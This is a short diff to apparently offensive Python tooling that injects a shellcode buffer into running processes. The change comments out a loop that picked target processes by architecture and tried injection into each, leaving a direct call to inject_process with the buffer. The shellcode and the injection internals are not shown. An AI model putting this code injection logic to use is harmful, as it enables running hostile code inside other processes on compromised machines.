@@ -92,4 +92,15 @@ def inject_process(shell_code, process_id=None):
  		return True
  		
 if __name__ == '__main__':
+	"""i_process = inject_get_processes()
+	is64 = False
+	if '64' in platform.machine():
+		is64 = True
+	for p in i_process:
+		if (is64 and 'x86' in p[2]) or not is64:
+			print('[v] Trying process "%s"...' % p[1])
+			if inject_process(buf, p[0]):
+				print('[*] Injected into %s!' % p[2])
+				sys.exit(0)"""
 	inject_process(buf, None)
+	#print('[!] No injects found!')
